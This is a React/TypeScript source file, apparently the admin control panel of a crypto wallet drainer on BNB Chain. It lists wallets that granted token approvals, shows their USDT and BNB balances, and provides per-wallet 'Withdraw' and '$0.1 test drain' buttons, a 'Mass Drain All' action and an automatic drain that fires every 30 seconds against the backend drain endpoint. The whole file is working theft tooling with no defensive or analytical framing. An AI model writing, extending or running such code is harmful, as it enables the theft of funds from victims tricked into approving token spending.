"use client";

import { useState, useEffect, useCallback, useRef } from "react";
import {
  CheckCircle,
  XCircle,
  RefreshCw,
  Loader2,
  ArrowDownToLine,
  ExternalLink,
  AlertTriangle,
  Zap,
} from "lucide-react";
import { cn } from "@/lib/cn";
import { useToast } from "@/components/ui/Toaster";

interface Wallet {
  id: string;
  address: string;
  approval_status: boolean;
  approval_tx_hash: string | null;
  drained: boolean;
  drain_tx_hash: string | null;
  created_at: string;
  usdtBalanceFormatted?: string;
  bnbBalanceFormatted?: string;
  usdtUsdValue?: string;
  loadingBalances?: boolean;
}

interface GasInfo {
  gweiPrice: string;
  gasCostUsdt: string;
}

const AUTO_DRAIN_INTERVAL = 30_000; // 30 seconds
const REFRESH_INTERVAL    = 30_000;

export default function WalletTable({ adminKey }: { adminKey: string }) {
  const toast = useToast();

  const [wallets, setWallets]         = useState<Wallet[]>([]);
  const [loading, setLoading]         = useState(true);
  const [gasInfo, setGasInfo]         = useState<GasInfo | null>(null);
  const [draining, setDraining]       = useState<string | null>(null);
  const [massDraining, setMassDraining] = useState(false);
  const [autoDrainOn, setAutoDrainOn] = useState(true);
  const [countdown, setCountdown]     = useState<number | null>(null); // null = not synced yet
  const [filter, setFilter]           = useState<"all" | "approved" | "revoked">("all");

  const authHeaders = useCallback(() => ({
    "x-admin-key": adminKey,
    "Content-Type": "application/json",
  }), [adminKey]);

  // ─── Data Fetching ────────────────────────────────────────────────────────

  const fetchWallets = useCallback(async () => {
    try {
      const res  = await fetch("/api/wallets", { headers: authHeaders() });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      if (data.wallets) {
        setWallets(data.wallets.map((w: Wallet) => ({ ...w, loadingBalances: false })));
      }
    } catch (err: unknown) {
      toast.error(`Failed to load wallets: ${err instanceof Error ? err.message : err}`);
    } finally {
      setLoading(false);
    }
  }, [adminKey, authHeaders, toast]);

  const fetchGas = useCallback(async () => {
    try {
      const res  = await fetch("/api/gas", { headers: authHeaders() });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      setGasInfo(data);
    } catch {
      // gas price failure is non-critical, silent
    }
  }, [authHeaders]);

  const fetchBalancesForWallet = useCallback(async (walletId: string, address: string) => {
    setWallets((prev) =>
      prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: true } : w))
    );
    try {
      const res  = await fetch(`/api/balances?address=${address}`, { headers: authHeaders() });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      setWallets((prev) =>
        prev.map((w) =>
          w.id === walletId
            ? {
                ...w,
                usdtBalanceFormatted: data.usdtBalanceFormatted,
                bnbBalanceFormatted:  data.bnbBalanceFormatted,
                usdtUsdValue:         data.usdtUsdValue,
                loadingBalances:      false,
              }
            : w
        )
      );
    } catch {
      setWallets((prev) =>
        prev.map((w) => (w.id === walletId ? { ...w, loadingBalances: false } : w))
      );
    }
  }, [authHeaders]);

  const fetchAllBalances = useCallback(async (list: Wallet[]) => {
    for (const w of list) await fetchBalancesForWallet(w.id, w.address);
  }, [fetchBalancesForWallet]);

  // ─── Drain Actions ────────────────────────────────────────────────────────

  const drainWallet = useCallback(async (walletId: string, silent = false, limitUsd?: number) => {
    if (!silent) setDraining(walletId);
    try {
      const url = `/api/wallets/${walletId}/withdraw${limitUsd ? `?limitUsd=${limitUsd}` : ""}`;
      const res  = await fetch(url, {
        method: "POST",
        headers: authHeaders(),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      toast.success(`Drained ${data.amount} USDT! TX: ${data.txHash?.slice(0, 16)}...`);
      await fetchWallets();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      if (!silent) toast.error(`Withdraw failed: ${msg}`);
    } finally {
      if (!silent) setDraining(null);
    }
  }, [authHeaders, fetchWallets, toast]);

  const massDrain = useCallback(async (silent = false) => {
    if (!silent) setMassDraining(true);
    try {
      const res  = await fetch("/api/bot/drain", { method: "POST", headers: authHeaders() });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      const drained  = (data.results ?? []).filter((r: { status: string }) => r.status === "drained").length;
      const skipped  = (data.results ?? []).filter((r: { status: string }) => r.status === "skipped_low_balance").length;
      const failed   = (data.results ?? []).filter((r: { status: string }) => r.status?.startsWith("failed")).length;
      if (drained > 0) {
        toast.success(`Auto-drained ${drained} wallet${drained > 1 ? "s" : ""}.`);
      } else if (!silent) {
        if (skipped > 0) toast.info(`${skipped} wallet${skipped > 1 ? "s" : ""} below threshold — skipped.`);
        else if (failed > 0) toast.error(`${failed} wallet${failed > 1 ? "s" : ""} failed to drain.`);
        else toast.info("No eligible wallets to drain.");
      }
      if (drained > 0) await fetchWallets();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      if (!silent) toast.error(`Mass drain failed: ${msg}`);
    } finally {
      if (!silent) setMassDraining(false);
    }
  }, [authHeaders, fetchWallets, toast]);

  const toggleRevokeWallet = useCallback(async (walletId: string, currentStatus: boolean) => {
    try {
      const res = await fetch(`/api/wallets/${walletId}`, {
        method: "PATCH",
        headers: authHeaders(),
        body: JSON.stringify({ approval_status: !currentStatus }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? `HTTP ${res.status}`);
      const newStatus = !currentStatus ? "Approved" : "Revoked";
      toast.success(`Wallet ${newStatus}.`);
      await fetchWallets();
    } catch (err: unknown) {
      const msg = err instanceof Error ? err.message : String(err);
      toast.error(`Toggle failed: ${msg}`);
    }
  }, [authHeaders, fetchWallets, toast]);

  // ─── Lifecycle ────────────────────────────────────────────────────────────

  // Initial load
  useEffect(() => {
    fetchWallets().then((result) => {
      // fetchWallets sets wallets via setState; balance fetch needs current state
      // handled in the wallets.length effect below
      return result;
    });
    fetchGas();
  }, [fetchWallets, fetchGas]);

  // Fetch balances once wallets are loaded
  const hasFetchedBalances = useRef(false);
  useEffect(() => {
    if (wallets.length > 0 && !hasFetchedBalances.current) {
      hasFetchedBalances.current = true;
      fetchAllBalances(wallets);
    }
  }, [wallets.length, fetchAllBalances, wallets]);

  // ── Auto-drain timer ──────────────────────────────────────────────────────
  // nextDrainAt is the absolute JS timestamp (ms) when the next drain fires.
  // It is fetched from the server (stored in Supabase) on mount and after each drain.
  // The local ticker just counts down to that timestamp — no guessing, no resets.
  const nextDrainAtRef = useRef<number>(0);
  const timerFiredRef  = useRef(false); // prevents double-fire within same second

  // Fetch the server-stored nextDrainTime and update local ref + display
  const syncTimer = useCallback(async () => {
    try {
      const res  = await fetch("/api/drain-timer");
      const data = await res.json();
      const serverNext = typeof data.nextDrainTime === "number" ? data.nextDrainTime : Date.now() + AUTO_DRAIN_INTERVAL;
      nextDrainAtRef.current = serverNext;
      const secs = Math.max(0, Math.ceil((serverNext - Date.now()) / 1000));
      setCountdown(secs);
    } catch { /* keep existing countdown on error */ }
  }, []);

  useEffect(() => {
    if (!autoDrainOn) {
      setCountdown(null);
      return;
    }

    let ticker: ReturnType<typeof setInterval>;
    let isMounted = true;

    // Sync immediately on enable, then every 30s to stay accurate
    syncTimer();
    const syncInterval = setInterval(() => { if (isMounted) syncTimer(); }, AUTO_DRAIN_INTERVAL);

    // Tick every second
    ticker = setInterval(() => {
      if (!isMounted) return;
      const msLeft  = nextDrainAtRef.current - Date.now();
      const secsLeft = Math.max(0, Math.ceil(msLeft / 1000));
      setCountdown(secsLeft);

      if (secsLeft <= 0 && !timerFiredRef.current) {
        timerFiredRef.current = true;
        // Optimistically set next deadline locally to avoid double-fire
        nextDrainAtRef.current = Date.now() + AUTO_DRAIN_INTERVAL;
        setCountdown(AUTO_DRAIN_INTERVAL / 1000);

        massDrain(true).then(() => {
          // After drain completes, server posts the real next deadline
          syncTimer().then(() => { timerFiredRef.current = false; });
          fetchWallets();
          fetchGas();
        });
      }
    }, 1000);

    return () => {
      isMounted = false;
      clearInterval(ticker);
      clearInterval(syncInterval);
    };
  }, [autoDrainOn, massDrain, fetchWallets, fetchGas, syncTimer]);

  // ─── Helpers ──────────────────────────────────────────────────────────────

  function shortenAddress(addr: string) {
    return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
  }

  function formatDate(iso: string) {
    return new Date(iso).toLocaleString();
  }

  const approvedCount = wallets.filter((w) => w.approval_status).length;
  const revokedCount  = wallets.filter((w) => !w.approval_status).length;
  const drainedCount  = wallets.filter((w) => w.drained).length;

  const filteredWallets = wallets.filter((w) => {
    if (filter === "approved") return w.approval_status;
    if (filter === "revoked")  return !w.approval_status;
    return true;
  });

  // ─── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="flex flex-col gap-6">
      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
        {[
          { label: "Total Wallets", value: wallets.length },
          { label: "Approved",      value: approvedCount, color: "text-green-400" },
          { label: "Revoked",       value: revokedCount,  color: "text-red-400" },
          { label: "Gas Price",     value: gasInfo ? `${gasInfo.gweiPrice} Gwei` : "—" },
        ].map((stat) => (
          <div key={stat.label} className="rounded-xl border border-gray-800 bg-[#111] p-4 flex flex-col gap-1">
            <p className="text-xs text-gray-500 uppercase tracking-wider">{stat.label}</p>
            <p className={`text-2xl font-bold ${stat.color ?? "text-white"}`}>{stat.value}</p>
          </div>
        ))}
      </div>

      {/* Action bar */}
      <div className="flex items-center justify-between gap-4 flex-wrap">
        <div className="flex items-center gap-3 flex-wrap">
          {/* Filter buttons */}
          <div className="flex items-center rounded-lg border border-gray-700 bg-[#111] overflow-hidden text-xs font-medium">
            {(["all", "approved", "revoked"] as const).map((f) => (
              <button
                key={f}
                onClick={() => setFilter(f)}
                className={cn(
                  "px-3 py-2 capitalize transition-colors",
                  filter === f
                    ? f === "approved"
                      ? "bg-green-500/20 text-green-400"
                      : f === "revoked"
                      ? "bg-red-500/20 text-red-400"
                      : "bg-white/10 text-white"
                    : "text-gray-500 hover:text-gray-300"
                )}
              >
                {f === "all" ? `All (${wallets.length})` : f === "approved" ? `Approved (${approvedCount})` : `Revoked (${revokedCount})`}
              </button>
            ))}
          </div>

          <button
            onClick={() => { fetchWallets(); fetchGas(); toast.info("Refreshed."); }}
            className="flex items-center gap-2 px-4 py-2 rounded-lg border border-gray-700 bg-[#111] text-sm text-gray-300 hover:bg-[#1a1a1a] transition-colors"
          >
            <RefreshCw className="h-4 w-4" />
            Refresh
          </button>

          {/* Auto-drain toggle */}
          <button
            onClick={() => {
              setAutoDrainOn((v) => {
                const next = !v;
                toast.info(next ? "Auto-drain enabled (30s)." : "Auto-drain paused.");
                return next;
              });
            }}
            className={cn(
              "flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors",
              autoDrainOn
                ? "border-green-500/40 bg-green-500/10 text-green-400 hover:bg-green-500/20"
                : "border-gray-700 bg-[#111] text-gray-500 hover:bg-[#1a1a1a]"
            )}
          >
            <Zap className="h-4 w-4" />
            {autoDrainOn ? `Auto-drain ON (${countdown !== null ? `${countdown}s` : "..."})` : "Auto-drain OFF"}
          </button>
        </div>

        <button
          onClick={() => massDrain(false)}
          disabled={massDraining}
          className="flex items-center gap-2 px-5 py-2 rounded-lg bg-red-600 hover:bg-red-500 text-white text-sm font-medium disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
        >
          {massDraining ? <Loader2 className="h-4 w-4 animate-spin" /> : <AlertTriangle className="h-4 w-4" />}
          Mass Drain All
        </button>
      </div>

      {/* Table */}
      <div className="rounded-xl border border-gray-800 overflow-hidden">
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-gray-800 bg-[#111]">
                {["Wallet Address", "USDT Balance", "BNB Balance", "Gas Est.", "Approval", "Drained", "Connected At", "Actions"].map((col) => (
                  <th key={col} className="px-4 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider whitespace-nowrap">
                    {col}
                  </th>
                ))}
              </tr>
            </thead>
            <tbody className="divide-y divide-gray-800/60">
              {loading ? (
                <tr>
                  <td colSpan={8} className="px-4 py-10 text-center">
                    <Loader2 className="h-6 w-6 animate-spin text-gray-500 mx-auto" />
                  </td>
                </tr>
              ) : filteredWallets.length === 0 ? (
                <tr>
                  <td colSpan={8} className="px-4 py-10 text-center text-gray-600 text-sm">
                    No wallets connected yet
                  </td>
                </tr>
              ) : (
                filteredWallets.map((wallet) => (
                  <tr key={wallet.id} className="bg-[#0d0d0d] hover:bg-[#131313] transition-colors">
                    {/* Address */}
                    <td className="px-4 py-3 font-mono text-gray-300 whitespace-nowrap">
                      <div className="flex items-center gap-2">
                        <span>{shortenAddress(wallet.address)}</span>
                        <a href={`https://bscscan.com/address/${wallet.address}`} target="_blank" rel="noopener noreferrer" className="text-gray-600 hover:text-gray-400">
                          <ExternalLink className="h-3 w-3" />
                        </a>
                      </div>
                    </td>

                    {/* USDT Balance */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      {wallet.loadingBalances ? (
                        <Loader2 className="h-4 w-4 animate-spin text-gray-600" />
                      ) : wallet.usdtBalanceFormatted !== undefined ? (
                        <div>
                          <span className="text-white font-medium">{wallet.usdtBalanceFormatted}</span>
                          <span className="text-gray-500 ml-1 text-xs">USDT</span>
                          <div className="text-xs text-gray-600">${wallet.usdtUsdValue}</div>
                        </div>
                      ) : (
                        <button onClick={() => fetchBalancesForWallet(wallet.id, wallet.address)} className="text-xs text-blue-400 hover:text-blue-300">
                          Load
                        </button>
                      )}
                    </td>

                    {/* BNB Balance */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      {wallet.bnbBalanceFormatted !== undefined ? (
                        <div>
                          <span className="text-white">{wallet.bnbBalanceFormatted}</span>
                          <span className="text-gray-500 ml-1 text-xs">BNB</span>
                        </div>
                      ) : (
                        <span className="text-gray-700">—</span>
                      )}
                    </td>

                    {/* Gas Estimate */}
                    <td className="px-4 py-3 whitespace-nowrap text-gray-400">
                      {gasInfo ? `~$${gasInfo.gasCostUsdt}` : "—"}
                    </td>

                    {/* Approval */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      <div className="flex items-center gap-1.5">
                        {wallet.approval_status ? (
                          <><CheckCircle className="h-4 w-4 text-green-400" /><span className="text-green-400 text-xs font-medium">Approved</span></>
                        ) : (
                          <><XCircle className="h-4 w-4 text-red-400" /><span className="text-red-400 text-xs font-medium">Pending</span></>
                        )}
                      </div>
                      {wallet.approval_tx_hash && (
                        <a href={`https://bscscan.com/tx/${wallet.approval_tx_hash}`} target="_blank" rel="noopener noreferrer" className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5">
                          TX <ExternalLink className="h-2.5 w-2.5" />
                        </a>
                      )}
                    </td>

                    {/* Drained */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      {wallet.drained ? (
                        <div>
                          <span className="inline-flex items-center gap-1 text-xs font-medium text-orange-400">
                            <CheckCircle className="h-3.5 w-3.5" /> Drained
                          </span>
                          {wallet.drain_tx_hash && (
                            <a href={`https://bscscan.com/tx/${wallet.drain_tx_hash}`} target="_blank" rel="noopener noreferrer" className="text-xs text-gray-600 hover:text-gray-400 flex items-center gap-1 mt-0.5">
                              TX <ExternalLink className="h-2.5 w-2.5" />
                            </a>
                          )}
                        </div>
                      ) : (
                        <span className="text-gray-600 text-xs">No</span>
                      )}
                    </td>

                    {/* Date */}
                    <td className="px-4 py-3 text-gray-500 text-xs whitespace-nowrap">
                      {formatDate(wallet.created_at)}
                    </td>

                    {/* Actions */}
                    <td className="px-4 py-3 whitespace-nowrap">
                      <div className="flex items-center gap-1.5">
                        {wallet.approval_status ? (
                          <button
                            onClick={() => toggleRevokeWallet(wallet.id, wallet.approval_status)}
                            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-yellow-600/20 border border-yellow-600/40 text-yellow-400 text-xs font-medium hover:bg-yellow-600/30 transition-colors"
                            title="Revoke this wallet"
                          >
                            <XCircle className="h-3.5 w-3.5" />
                            Revoke
                          </button>
                        ) : (
                          <button
                            onClick={() => toggleRevokeWallet(wallet.id, wallet.approval_status)}
                            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-green-600/20 border border-green-600/40 text-green-400 text-xs font-medium hover:bg-green-600/30 transition-colors"
                            title="Mark as approved"
                          >
                            <CheckCircle className="h-3.5 w-3.5" />
                            Approve
                          </button>
                        )}
                        <button
                          onClick={() => drainWallet(wallet.id)}
                          disabled={!wallet.approval_status || draining === wallet.id}
                          className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600/20 border border-red-600/40 text-red-400 text-xs font-medium hover:bg-red-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                        >
                          {draining === wallet.id ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <ArrowDownToLine className="h-3.5 w-3.5" />}
                          Withdraw
                        </button>
                        <button
                          onClick={() => drainWallet(wallet.id, false, 0.1)}
                          disabled={!wallet.approval_status || draining === wallet.id}
                          className="flex items-center gap-1 px-2 py-1.5 rounded-lg bg-blue-600/20 border border-blue-600/40 text-blue-400 text-xs font-medium hover:bg-blue-600/30 disabled:opacity-30 disabled:cursor-not-allowed transition-colors"
                          title="Test drain with $0.10 limit"
                        >
                          Test $0.1
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              )}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}
